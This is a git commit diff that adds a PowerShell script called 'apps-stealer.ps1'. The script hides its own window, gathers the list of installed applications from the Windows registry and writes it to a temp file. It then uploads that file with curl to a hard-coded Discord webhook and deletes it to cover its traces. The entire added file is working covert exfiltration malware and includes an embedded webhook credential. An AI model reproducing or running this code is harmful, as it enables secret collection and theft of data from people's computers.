e1c9c0d93ed4302c7b46dc5aff140582ddfefc39
Jakov C <qwerasdftzu@gmail.com>
2024-02-06 19:12:18 +0100

    Add powershell version of app-stealer

---
+++ apps-stealer/apps-stealer.ps1
@@ -0,0 +1,21 @@
+$dc = "https://discord.com/api/webhooks/1167797406386094191/dRg_yctHuS3NHn-V7uU03w7xc_tsTJGTGMT4LUI4C87POMlVcfws0RWKIwnPHx9UFut8"
+$v = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion; $y = $v.Substring(0, 2); if ($y -gt 21) { $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'; $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru; $hwnd = (Get-Process -PID $pid).MainWindowHandle; if ($hwnd -ne [System.IntPtr]::Zero) { $Type::ShowWindowAsync($hwnd, 0) }else { $Host.UI.RawUI.WindowTitle = 'hideme'; $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' }); $hwnd = $Proc.MainWindowHandle; $Type::ShowWindowAsync($hwnd, 0) } };
+# Get a list of all installed applications
+$apps = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
+Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
+Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "^KB\d+" }
+
+# If 64-bit, get additional apps from 32-bit registry path
+if ([Environment]::Is64BitOperatingSystem) {
+  $apps += Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
+  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
+  Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "^KB\d+" }
+}
+
+# Format the list of applications as a string
+$appList = $apps | Sort-Object DisplayName | Format-Table -AutoSize | Out-String
+
+$path = "$env:TEMP\apps.txt"
+$appList | Out-File $path
+curl.exe -F file1=@"$path" $dc
+Remove-Item $path -Force
